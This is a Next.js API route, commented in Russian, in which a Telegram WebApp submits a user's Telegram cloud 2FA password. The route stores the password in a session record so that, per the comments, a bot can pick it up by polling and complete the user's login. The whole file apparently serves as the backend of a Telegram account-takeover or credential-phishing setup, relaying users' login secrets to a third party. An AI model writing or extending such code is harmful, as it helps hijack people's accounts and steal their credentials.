import { type NextRequest, NextResponse } from "next/server"
import { getTelegramAuth, updateTelegramAuth } from "@/lib/auth-store"

// WebApp отправляет облачный пароль 2FA
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { telegramId, password } = body

    if (!telegramId || !password) {
      return NextResponse.json({ success: false, error: "Missing telegramId or password" }, { status: 400 })
    }

    const telegramIdStr = telegramId.toString()
    const auth = getTelegramAuth(telegramIdStr)

    if (!auth) {
      return NextResponse.json(
        {
          success: false,
          error: "Сессия не найдена",
        },
        { status: 400 },
      )
    }

    if (auth.status !== "pending_2fa") {
      return NextResponse.json(
        {
          success: false,
          error: "2FA не требуется или код ещё не подтверждён",
        },
        { status: 400 },
      )
    }

    // Обновляем статус - бот заберёт пароль через polling
    updateTelegramAuth(telegramIdStr, {
      code: password, // Используем поле code для передачи пароля
      status: "pending_2fa",
    })

    console.log(`[Auth] 2FA password received from webapp for ${telegramIdStr}`)

    return NextResponse.json({
      success: true,
      message: "Password received, waiting for verification",
    })
  } catch (error) {
    console.error("Error verifying 2FA:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
